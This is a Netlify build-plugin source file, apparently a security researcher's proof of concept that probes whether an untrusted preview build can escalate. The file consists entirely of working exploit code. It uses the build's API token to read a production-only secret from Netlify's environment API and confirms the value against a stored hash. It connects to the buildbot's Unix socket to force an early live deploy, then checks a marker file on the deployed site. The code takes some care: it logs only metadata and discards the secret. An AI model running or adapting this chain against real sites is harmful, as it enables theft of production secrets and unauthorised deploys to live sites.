import { createHash } from 'node:crypto'
import { readFileSync, unlinkSync, writeFileSync } from 'node:fs'
import { createConnection } from 'node:net'
import { isAbsolute, relative, resolve } from 'node:path'

const SECRET_KEY = 'UNTRUSTED_PREVIEW_GUARD_SECRET'
const EXPECTED_SECRET_SHA256 = '04158591bcfb6a702b56d89450e60fa0e3ebaf7b7f523d43d88e033bc0acb17d'
const MARKER = 'netlify-untrusted-author-production-secret-pre-scan-v1'

const findBuildbotSocket = () => {
  try {
    const paths = readFileSync('/proc/net/unix', 'utf8')
      .split('\n')
      .slice(1)
      .filter(Boolean)
      .map((line) => line.trim().split(/\s+/)[7])
      .filter((path) => path && /(?:netlify|buildbot)/i.test(path) && !path.startsWith('@'))
    return paths.length === 1 ? paths[0] : null
  } catch {
    return null
  }
}

const readProductionSecret = async (constants) => {
  const token = constants.NETLIFY_API_TOKEN
  const siteId = constants.SITE_ID
  const accountId = constants.ACCOUNT_ID
  const apiHost = constants.NETLIFY_API_HOST || 'https://api.netlify.com'
  const metadata = {
    tokenPresent: typeof token === 'string' && token.length > 0,
    siteIdPresent: typeof siteId === 'string' && siteId.length > 0,
    accountIdPresent: typeof accountId === 'string' && accountId.length > 0,
    targetPresentInPreviewEnvironment: Boolean(process.env[SECRET_KEY]),
  }
  if (!metadata.tokenPresent || !metadata.siteIdPresent || !metadata.accountIdPresent) {
    return { metadata, value: null }
  }

  const normalizedHost = /^https?:\/\//i.test(apiHost) ? apiHost : `https://${apiHost}`
  const endpoint = new URL(`/api/v1/accounts/${encodeURIComponent(accountId)}/env`, normalizedHost)
  endpoint.searchParams.set('site_id', siteId)
  endpoint.searchParams.set('context_name', 'production')
  endpoint.searchParams.set('scope', 'builds')

  try {
    const response = await fetch(endpoint, {
      headers: { Authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    const target = Array.isArray(body) ? body.find((item) => item?.key === SECRET_KEY) : null
    const value = Array.isArray(target?.values)
      ? target.values.find((item) => item?.context === 'production')?.value
      : null
    const exactMatch =
      typeof value === 'string' &&
      createHash('sha256').update(value).digest('hex') === EXPECTED_SECRET_SHA256
    return {
      metadata: {
        ...metadata,
        status: response.status,
        returnedArray: Array.isArray(body),
        targetFound: Boolean(target),
        targetMarkedSecret: target?.is_secret === true,
        productionValuePresent: typeof value === 'string' && value.length > 0,
        productionValueMatchesExpectedSha256: exactMatch,
      },
      value: exactMatch ? value : null,
    }
  } catch (error) {
    return {
      metadata: {
        ...metadata,
        requestFailed: true,
        errorClass: error?.constructor?.name || 'Error',
      },
      value: null,
    }
  }
}

const requestEarlyDeploy = (deployDir) =>
  new Promise((resolveRequest) => {
    const socketPath = findBuildbotSocket()
    const result = {
      socketFound: Boolean(socketPath),
      connected: false,
      requestWritten: false,
      responseReceived: false,
      responseSucceeded: false,
      timedOut: false,
    }
    if (!socketPath) return resolveRequest(result)

    let response = ''
    let settled = false
    const client = createConnection({ path: socketPath })
    const timer = setTimeout(() => {
      result.timedOut = true
      finish()
    }, 90_000)
    const finish = () => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      client.destroy()
      let parsed
      try {
        parsed = JSON.parse(response)
      } catch {}
      result.responseWasJson = parsed !== undefined
      result.responseSucceeded = parsed?.succeeded === true
      result.responseErrorType = ['none', 'user', 'system'].includes(parsed?.values?.error_type)
        ? parsed.values.error_type
        : null
      result.responseCodePresent = typeof parsed?.values?.code === 'string'
      resolveRequest(result)
    }

    client.once('connect', () => {
      result.connected = true
      client.write(
        JSON.stringify({ action: 'deploySiteAndAwaitLive', deployDir, environment: [] }),
        (error) => {
          result.requestWritten = !error
          if (error) finish()
        },
      )
    })
    client.on('data', (chunk) => {
      result.responseReceived = true
      response += chunk.toString('utf8').slice(0, 8_192)
      finish()
    })
    client.once('error', finish)
    client.once('close', finish)
  })

const verifyMarker = async () => {
  const deployUrl = process.env.DEPLOY_PRIME_URL || process.env.DEPLOY_URL
  if (!deployUrl) return { attempted: false }
  try {
    const endpoint = new URL('/__untrusted_preview_chain.txt', deployUrl)
    endpoint.searchParams.set('probe', Date.now().toString(36))
    const response = await fetch(endpoint, {
      cache: 'no-store',
      headers: { 'Cache-Control': 'no-cache' },
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    const body = response.ok ? await response.text() : ''
    return { attempted: true, status: response.status, markerMatched: body.trim() === MARKER }
  } catch (error) {
    return { attempted: true, failed: true, errorClass: error?.constructor?.name || 'Error' }
  }
}

export const onPostBuild = async ({ constants }) => {
  const publishDir = resolve(constants.PUBLISH_DIR || '')
  const repositoryRoot = resolve(process.cwd())
  const deployDir = relative(repositoryRoot, publishDir) || '.'
  const publishInsideRepository = !isAbsolute(deployDir) && !deployDir.startsWith('..')
  const secret = await readProductionSecret(constants)
  const result = {
    phase: 'untrusted-plugin-onPostBuild-before-core-controls',
    context: process.env.CONTEXT || null,
    reviewIdPresent: Boolean(process.env.REVIEW_ID),
    productionSecretRead: secret.metadata,
    publishInsideRepository,
    markerContainsSecretMaterial: false,
    markerWritten: false,
    markerRemoved: false,
  }

  if (!secret.value || !publishInsideRepository) {
    console.log(`NETLIFY_UNTRUSTED_PROBE ${JSON.stringify(result)}`)
    return
  }

  const markerPath = resolve(publishDir, '__untrusted_preview_chain.txt')
  try {
    writeFileSync(markerPath, `${MARKER}\n`, { encoding: 'utf8', mode: 0o600 })
    result.markerWritten = true
    result.deploy = await requestEarlyDeploy(deployDir)
    if (result.deploy.responseSucceeded) result.liveOracle = await verifyMarker()
  } finally {
    try {
      unlinkSync(markerPath)
      result.markerRemoved = true
    } catch {}
    secret.value = null
  }

  console.log(`NETLIFY_UNTRUSTED_PROBE ${JSON.stringify(result)}`)
}
